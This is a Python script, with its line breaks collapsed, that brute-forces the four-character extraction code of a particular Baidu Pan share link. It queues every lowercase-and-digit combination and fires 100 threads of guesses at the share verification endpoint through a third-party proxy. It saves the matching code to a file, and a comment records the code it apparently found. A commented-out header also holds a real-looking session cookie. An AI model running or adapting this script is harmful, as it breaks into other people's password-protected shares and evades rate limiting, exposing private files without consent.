#!/usr/bin/env python# -*- coding: utf-8 -*-# Created by spider3 on 2018/5/17# Copyright (c) 2018 spider3. All rights reserved."""https://pan.baidu.com/share/verify?surl=NPwDPdUg1CKTRlbserwv3g&t=1526547802863&channel=chunlei&web=1&app_id=250528&bdstoken=null&logid=MTUyNjU0NzgwMjg2MzAuMzA2ODE0MzcyMjU0ODY4ODU=&clienttype=0""https://pan.baidu.com/share/verify?surl=NPwDPdUg1CKTRlbserwv3g&t=1526549209639&channel=chunlei&web=1&app_id=250528&bdstoken=null&logid=MTUyNjU0OTIwOTY0MDAuMTQ4NDQ4ODAzODM3NzM2NQ==&clienttype=0""https://pan.baidu.com/share/verify?surl=NPwDPdUg1CKTRlbserwv3g&t=1526550370088&channel=chunlei&web=1&app_id=250528&bdstoken=null&logid=MTUyNjU1MDM3MDA4OTAuMTMwNTI5NTUwNTI1OTE0MDg=&clienttype=0""https://pan.baidu.com/share/init?surl=NPwDPdUg1CKTRlbserwv3g"import requestsimport timeimport stringimport queuefrom threading import Threadfrom retry import retryq = queue.Queue()@retry(2)def check_password():    headers = {        'Accept': '*/*',        'Accept-Encoding': 'gzip, deflate, br',        'Accept-Language': 'zh-CN,zh;q=0.9',        'Connection': 'keep-alive',        'Content-Length': '31',        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',        # 'Cookie': 'PANWEB=1; BAIDUID=74CE951A9FADBD8EC707DD4D73796764:FG=1; Hm_lvt_7a3960b6f067eb0085b7f96ff5e660b0=1525335917,1525777370,1526544151,1526547324; FP_UID=7f0c25add5f79c62826acfe6346e7567; PSTM=1526548768; H_PS_PSSID=1455_25809_26458_21085_26350_20929; BIDUPSID=3DB597BA1133835071426999EFB10982; PSINO=7; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598; Hm_lpvt_7a3960b6f067eb0085b7f96ff5e660b0=1526549203',        'Host': 'pan.baidu.com',        'Origin': 'https://pan.baidu.com',        'Referer': 'https://pan.baidu.com/share/init?surl=NPwDPdUg1CKTRlbserwv3g',        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',        'X-Requested-With': 'XMLHttpRequest',    }    # se = requests.session()    # se.get("https://pan.baidu.com/share/init?surl=NPwDPdUg1CKTRlbserwv3g",headers = headers)    t = str(time.time()).replace(".", "")[:-4]    url = "https://pan.baidu.com/share/verify?surl=NPwDPdUg1CKTRlbserwv3g&t={}&channel=chunlei&web=1&app_id=250528&bdstoken=null&logid=MTUyNjU0NzgwMjg2MzAuMzA2ODE0MzcyMjU0ODY4ODU=&clienttype=0".format(t)    pwd = q.get()    data = {"pwd": pwd}    proxies = {"http": "http://221.234.248.37:8010"}    responde = requests.post(url, headers=headers,data=data,proxies=proxies )    print(pwd, responde.text)    if '"errno":0,' in responde.text:        print(pwd, "就是它了！")        with open("./pwd.txt", "w") as f:            f.write(pwd)        q.queue.clear()        return pwd    else:        print(pwd, "不是")def che():    all_letter = string.ascii_lowercase+string.digits    for a in all_letter:        for b in all_letter:            for c in all_letter:                for d in all_letter:                    q.put(a+b+c+d)    while not q.empty():        ths = [Thread(target=check_password, ) for _ in range(100)]        for th in ths:            th.start()        for th in ths:            th.join()def main():    #    # che()    # print(string.ascii_lowercase+string.digits)    q.put("aic5")    check_password()# aic5if __name__ == '__main__':    main()